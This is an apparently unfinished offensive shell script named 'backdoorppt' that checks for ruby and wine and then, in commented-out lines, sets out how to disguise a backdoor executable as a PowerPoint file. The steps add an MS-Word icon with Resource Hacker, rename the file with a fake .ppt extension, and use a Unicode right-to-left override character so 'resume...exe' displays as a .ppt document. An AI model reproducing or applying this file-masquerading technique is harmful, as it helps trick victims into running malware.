#!/bin/sh




# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}



# banner
cat << !

    +-+-+-+-+-+-+-+-+-+-+-+
    |b|a|c|k|d|o|o|r|p|p|t|
    +-+-+-+-+-+-+-+-+-+-+-+
 'A binary transformation tool'
 Credits: Damon Mohammadbagher

!


Colors;
echo ${BlueF}[☆]${YellowF} Please wait, checking backend applications! ${Reset};
sleep 1
# ----------------------
# check for dependencies
# ----------------------
apc=`which ruby`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} Ruby installation '->' ${RedF}not found! ${Reset};
echo ${RedF}[☠]${white} This script requires ruby to work! ${Reset};
sleep 1
exit
else
echo ${BlueF}[☆]${white} Ruby installation  '->' ${GreenF}found! ${Reset};
sleep 1
fi

apc=`which wine`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} wine installation '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires wine to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install wine ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
else
echo ${BlueF}[☆]${white} wine installation  '->' ${GreenF}found! ${Reset};
sleep 1
fi

if [ -e "/root/.wine/drive_c/Program Files" ]; then
echo ${BlueF}[☆]${white} Wine Program Files '->' ${GreenF}found! ${Reset};
sleep 1
else
echo ${RedF}[☠]${white} Wine Program Files '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} Please wait, running winecfg! ${Reset};
winecfg > /dev/null 2>&1
sleep 1
exit
fi




read OP
# ------------------------
# start of script funtions
# ------------------------
clear
echo ""
echo ${BlueF}[☆]${white} Please 'select' [${GreenF}windows 7${white}] OS${Reset};
# winecfg > /dev/null 2>&1


# wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
# wine /root/.wine/drive_c/"Program Files"/"Resource Hacker"/ResourceHacker.exe -open /root/putty.exe -save /root/backdoor.exe -action addskip -res /root/MS-Word-32x32.ico -mask ICONGROUP,MAINICON,

# insert .ppt hidden extension
# mv backdoor.exe  backdoor_ppt.exe

# rename backdoor name
# ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'




